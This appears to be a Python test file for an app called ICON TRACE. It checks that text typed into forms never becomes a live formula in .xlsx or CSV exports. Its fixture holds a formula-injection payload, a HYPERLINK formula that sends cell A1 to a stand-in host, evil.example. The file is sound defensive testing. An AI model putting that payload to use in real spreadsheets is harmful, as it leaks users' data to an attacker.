"""
ICON TRACE - an export never turns typed text into a spreadsheet formula.

    python test_export_formulas.py

Every export carries text operators typed - a gate pass's party, a reason,
a customer. Found 25 Sep: openpyxl stores any string starting with '=' as a
FORMULA, so '=HYPERLINK(...)' typed into a form became a live formula in the
workbook of whoever pressed Export; and Excel reads CSV text opening with
= + - @ as a formula when the file is opened. Now:

    .xlsx (/api/export/xlsx)   such cells are stored as TEXT - they show
                               exactly what was typed, nothing prefixed
    .csv  (/export/<what>.csv, and a table's own CSV export in the page)
                               such text gets OWASP's leading apostrophe
    numbers (-5, +3.2)         untouched everywhere
"""

import csv, io, os, sys, tempfile, traceback

TMP = tempfile.mkdtemp(prefix="icontrace_xlf_")
os.environ["ICON_DB_FILE"] = os.path.join(TMP, "t.db")

import store                                                 # noqa: E402
import app as APP                                            # noqa: E402
import auth_test_helper as AUTH                              # noqa: E402
import ui_harness as H                                       # noqa: E402

_results = []


def test(name):
    def deco(fn):
        _results.append((name, fn))
        return fn
    return deco


EVIL = '=HYPERLINK("http://evil.example/?"&A1,"click")'
AT = "@SUM(1+1)"


def client():
    store.wipe()
    AUTH.ensure_auth_schema()
    c = APP.app.test_client()
    AUTH.test_login(c)
    return c


@test(".xlsx: a cell or header starting with '=' is stored as text, exactly "
     "as typed - never a formula; numbers stay numbers")
def t_xlsx_no_formulas():
    from openpyxl import load_workbook
    c = client()
    r = c.post("/api/export/xlsx", json={"filename": "t", "sheets": [{
        "title": "Gate passes", "columns": ["Party", "=Header", "Qty"],
        "rows": [[EVIL, AT, "-5"], ["plain", "+3.2", "12"]]}]})
    assert r.status_code == 200, r.get_data()[:200]
    ws = load_workbook(io.BytesIO(r.data)).active
    rows = list(ws.iter_rows())
    for cell in rows[0] + rows[1] + rows[2]:
        assert cell.data_type != "f", "a formula in %s: %r" % (cell.coordinate, cell.value)
    assert rows[0][1].value == "=Header"
    assert rows[1][0].value == EVIL, rows[1][0].value           # exactly as typed
    assert rows[1][1].value == AT
    assert rows[1][2].value == -5 and rows[2][2].value == 12    # still numbers
    assert rows[2][1].value == "+3.2"     # _xlsx_value never took a leading + as a number
    print("      %s stored as text %r" % (rows[1][0].coordinate, rows[1][0].data_type))


@test(".csv from the server: a gate pass whose party opens with '=' is "
     "exported with a leading apostrophe; ordinary values untouched")
def t_server_csv():
    c = client()
    r = c.post("/api/gatepass", json={"kind": "RGP", "party": EVIL,
                                      "description": "-5 spare frames", "qty": 1})
    assert r.status_code == 200, r.get_json()
    r = c.get("/export/gatepass.csv")
    assert r.status_code == 200
    got = list(csv.reader(io.StringIO(r.get_data(as_text=True))))
    assert got[0][:4] == ["gp_no", "gp_date", "kind", "party"], got[0]
    row = got[1]
    assert row[3] == "'" + EVIL, row[3]
    assert row[4] == "'-5 spare frames", row[4]    # text that merely starts with -
    assert row[2] == "RGP"
    print("      party cell: %r" % row[3][:30])


@test(".csv from a table in the page (icon_table.js exportCsv): formula-like "
     "text is apostrophed, numbers are not")
def t_client_csv():
    client()
    with H.browser() as b:
        pg = H.open_page(b, wait_ms=800, role="Super Admin", login_id="sa1")
        text = pg.evaluate("""(vals) => new Promise(function (done) {
            var root = document.createElement('div');
            root.setAttribute('data-export', 't');
            root.innerHTML = '<table><thead><tr><th>A</th><th>B</th><th>C</th></tr></thead>' +
              '<tbody><tr><td></td><td></td><td></td></tr></tbody></table>';
            var td = root.querySelectorAll('tbody td');
            td[0].textContent = vals[0]; td[1].textContent = vals[1]; td[2].textContent = '-5';
            document.body.appendChild(root);
            var orig = URL.createObjectURL;
            URL.createObjectURL = function (blob) {
              URL.createObjectURL = orig;
              blob.text().then(done);
              return 'blob:x';
            };
            HTMLAnchorElement.prototype.click = function () {};
            window.iconTable.exportCsv(root);
            root.remove();
        })""", [EVIL, AT])
        lines = text.lstrip("﻿").split("\r\n")
        got = next(csv.reader(io.StringIO(lines[1])))
        assert got == ["'" + EVIL, "'" + AT, "-5"], got
        print("      row: %r" % got)


if __name__ == "__main__":
    sys.stdout.reconfigure(errors="replace")
    width = max(len(n) for n, _ in _results)
    passed = failed = 0
    try:
        for name, fn in _results:
            try:
                fn()
                print("  PASS  %-*s" % (width, name))
                passed += 1
            except Exception as e:
                print("  FAIL  %-*s  %s" % (width, name, e))
                traceback.print_exc()
                failed += 1
    finally:
        H.cleanup()
    print("\n%d passed, %d failed" % (passed, failed))
    sys.exit(1 if failed else 0)
